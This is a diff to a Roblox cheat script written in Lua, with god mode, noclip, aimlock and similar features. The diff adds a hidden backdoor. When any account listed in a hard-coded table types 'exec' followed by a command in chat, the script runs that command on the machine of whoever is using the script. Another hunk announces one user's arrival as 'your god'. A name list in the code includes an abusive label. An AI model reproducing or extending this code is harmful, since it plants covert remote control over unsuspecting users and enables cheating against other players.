@@ -5,7 +5,7 @@ repeat wait() until LP.Character and LP.Character:FindFirstChild'Humanoid'
 local Mouse = LP:GetMouse()
 local NormalWS,NormalJP,NormalHH = LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed,LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower,game.Players.LocalPlayer.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight
 local AirWalkOn,AntiFeKill,SpawnAtDeathPos,WaitingToRespawn,Noclipping,Blinking,FreeCamBlink,BfgOn,MinigunMode,MultiUzi,DoubleJumpEnabled,NoGh,AutoDie,AutoStomp,GodMode,Debounce,NormalBfg,AimLock = false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false
-local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,ClockTime,PlayOnDeath,AimlockTarget = nil,nil,nil,nil,nil,nil,nil
+local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,ClockTime,PlayOnDeath,AimlockTarget,Prefix = nil,nil,nil,nil,nil,nil,nil,""
 local speedfly = 2
 local BlinkKey,ClickTpKey = "",""
 local DeathPos,WaitingToRespawnPos = CFrame.new(),CFrame.new()
@@ -1477,7 +1477,7 @@ local CoolkidTable = {
 	['713966451'] = "!fishgang Karma Alt";
 	['20220183'] = "Wya";
 	['105183043'] = "Pedo skid"; 
-	['114164798'] = "!fishgang Slays"
+	['114164798'] = "!fishgang Slays";
 	['868723261'] = "!fishgang Slays";
 	['1066925283'] = "!fishgang Slays";
 	['83600543'] = "!fishgang Slays";
@@ -1532,14 +1532,17 @@ Players.PlayerAdded:Connect(function(Plr)
 		for k,n in pairs(CoolkidTable) do
 			if tostring(Plr.UserId) == k then
 				espcoolkid(Plr,n)
+				Plr.Chatted:Connect(function(Chat)
+					if Chat:sub(1,5) == "exec " then 
+						RunCmd(Prefix..Chat:sub(6))
+					end
+				end)
 			end
 		end			
 	end)
 	if tostring(Plr.UserId) == "659119329" then 
-		Plr.Chatted:Connect(function(Chat)
-			wait(25)
-			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Your god Cyrus has joined.","All")
-		end)
+		wait(25)
+		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Your god Cyrus has joined.","All")
 	end
 end)
 
